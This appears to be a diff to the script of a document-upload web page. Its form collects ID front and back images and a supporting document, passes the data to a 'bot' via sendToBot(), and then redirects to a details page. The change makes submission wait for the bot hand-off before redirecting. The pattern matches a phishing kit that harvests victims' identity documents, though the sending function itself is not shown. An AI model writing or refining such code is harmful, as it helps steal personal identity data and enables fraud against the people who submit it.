@@ -351,7 +351,7 @@
         }
 
         // Form submission - collect all document data for bot
-        document.getElementById('documents-form').addEventListener('submit', function(e) {
+        document.getElementById('documents-form').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             // Store document info in sessionStorage for bot
@@ -367,10 +367,10 @@
             sessionStorage.setItem('idBackName', idBackInput.files[0] ? idBackInput.files[0].name : '');
             sessionStorage.setItem('supportingDocName', supportingDocInput.files[0] ? supportingDocInput.files[0].name : '');
             
-            // Send to bot
-            sendToBot();
+            // Send to bot and wait for completion
+            await sendToBot();
             
-            // Redirect
+            // Redirect after sending
             window.location.href = 'details.html';
         });
 
